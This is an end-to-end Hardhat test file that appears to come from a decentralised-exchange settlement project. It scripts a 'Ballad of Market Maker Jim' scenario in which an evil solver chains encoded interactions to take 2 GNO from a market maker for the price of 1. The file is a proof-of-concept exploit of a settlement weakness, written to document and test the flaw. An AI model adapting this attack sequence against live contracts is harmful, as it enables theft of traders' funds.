import ERC20 from "@openzeppelin/contracts/build/contracts/ERC20PresetMinterPauser.json";
import { expect } from "chai";
import { Contract, Wallet } from "ethers";
import { ethers, waffle } from "hardhat";

import {
  OrderKind,
  SettlementEncoder,
  SigningScheme,
  TypedDataDomain,
  domain,
} from "../../src/ts";

import { deployTestContracts } from "./fixture";
import * as ZeroExV2 from "./zero-ex/v2";

describe("E2E: The Ballad of Market Maker Jim", () => {
  let deployer: Wallet;
  let evilSolver: Wallet;
  let jim: Wallet;

  let settlement: Contract;
  let allowanceManager: Contract;
  let domainSeparator: TypedDataDomain;

  let owl: Contract;
  let gno: Contract;
  let evilSolverBalance: Contract;
  let zeroEx: ZeroExV2.Deployment;

  beforeEach(async () => {
    const deployment = await deployTestContracts();

    ({
      deployer,
      settlement,
      allowanceManager,
      wallets: [evilSolver, jim],
    } = deployment);

    const { authenticator, manager } = deployment;
    await authenticator.connect(manager).addSolver(evilSolver.address);

    const { chainId } = await ethers.provider.getNetwork();
    domainSeparator = domain(chainId, settlement.address);

    owl = await waffle.deployContract(deployer, ERC20, ["OWL", 18]);
    gno = await waffle.deployContract(deployer, ERC20, ["GNO", 18]);

    const EvilSolverBalance = await ethers.getContractFactory(
      "EvilSolverBalance",
    );
    evilSolverBalance = await EvilSolverBalance.deploy(evilSolver.address);
    zeroEx = await ZeroExV2.deployExchange(deployer);
  });

  it("should be very sad for Market Maker Jim", async () => {
    // This is the Ballad of Market Maker Jim.
    //
    // Jim was a market maker. He loved making markets, specifically, making
    // OWL-GNO markets. Jim, however, was ambitious and decided to integrate
    // into as many DEXs as possible, including the awesome GPv2 and the less
    // awesome 0x. What Jim didn't know was that an evil solver was plotting
    // to take all his hard earned crypto-assets. Duh Duh DUUUH.
    //
    // The idea behind this attack is to leverage:
    // - The fact that the balance check is not enough to guarantee that the
    //   interaction is indeed just adding to it, or getting it from another
    //   source
    // - The order's sell amount gets transferred first
    // - The order's sell amount can be used to trade with the trader himself
    //   on other protocols.

    // Jim and allows traders to get binding GPv2 and 0x orders for trading at
    // the following price:
    // - Sells 1 GNO for 135 OWL
    const jimOrder = {
      gnoSellAmount: ethers.utils.parseEther("1.0"),
      owlBuyAmount: ethers.utils.parseEther("135.0"),
    };

    const gpv2Order = {
      kind: OrderKind.SELL,
      partiallyFillable: false,
      sellToken: gno.address,
      buyToken: owl.address,
      sellAmount: jimOrder.gnoSellAmount,
      buyAmount: jimOrder.owlBuyAmount,
      feeAmount: ethers.constants.Zero,
      validTo: 0xffffffff,
      appData: 1,
    };

    const zeroExOrder = {
      takerAddress: settlement.address,
      makerAssetAddress: gno.address,
      makerAssetAmount: jimOrder.gnoSellAmount,
      takerAssetAddress: owl.address,
      takerAssetAmount: jimOrder.owlBuyAmount,
    };

    await gno.mint(jim.address, jimOrder.gnoSellAmount.mul(2));
    await gno
      .connect(jim)
      .approve(allowanceManager.address, ethers.constants.MaxUint256);
    await gno
      .connect(jim)
      .approve(zeroEx.erc20Proxy.address, ethers.constants.MaxUint256);

    // NOTE: Here, the evil solver is using its own OWL to trade with Jim on 0x.
    // However, a slightly more sophisticated attack you use the GNO from Jim's
    // GPv2 order to, say, go to Uniswap to swap for owl. This way the evil
    // solver would only have to pay the spread + slippage in order to get one
    // free GNO from Jim.
    await owl.mint(evilSolverBalance.address, ethers.utils.parseEther("135.0"));

    const zeroExSignedOrder = await ZeroExV2.signSimpleOrder(
      jim,
      zeroEx.domainSeparator,
      zeroExOrder,
    );
    const encoder = new SettlementEncoder(domainSeparator);
    await encoder.signEncodeTrade(gpv2Order, jim, SigningScheme.EIP712);
    encoder.encodeInteraction({
      target: evilSolverBalance.address,
      callData: evilSolverBalance.interface.encodeFunctionData("transferTo", [
        owl.address,
        settlement.address,
        jimOrder.owlBuyAmount,
      ]),
    });
    encoder.encodeInteraction({
      target: owl.address,
      callData: owl.interface.encodeFunctionData("approve", [
        zeroEx.erc20Proxy.address,
        jimOrder.owlBuyAmount,
      ]),
    });
    encoder.encodeInteraction({
      target: zeroEx.exchange.address,
      callData: zeroEx.exchange.interface.encodeFunctionData("fillOrder", [
        zeroExSignedOrder.order,
        jimOrder.owlBuyAmount,
        zeroExSignedOrder.signature,
      ]),
    });
    encoder.encodeInteraction({
      target: gno.address,
      callData: gno.interface.encodeFunctionData("transfer", [
        evilSolver.address,
        jimOrder.gnoSellAmount,
      ]),
    });

    await settlement.connect(evilSolver).settleSingleTrade(
      ...encoder.encodeSingleTradeSettlement([
        {
          target: evilSolver.address,
          amount: gpv2Order.sellAmount,
        },
      ]),
    );

    // NOTE: The evil solver got 2 GNO for the price of 1.
    expect(await owl.balanceOf(jim.address)).to.deep.equal(
      jimOrder.owlBuyAmount,
    );
    expect(await gno.balanceOf(jim.address)).to.deep.equal(
      ethers.constants.Zero,
    );
    expect(await gno.balanceOf(evilSolver.address)).to.deep.equal(
      jimOrder.gnoSellAmount.mul(2),
    );
  });
});
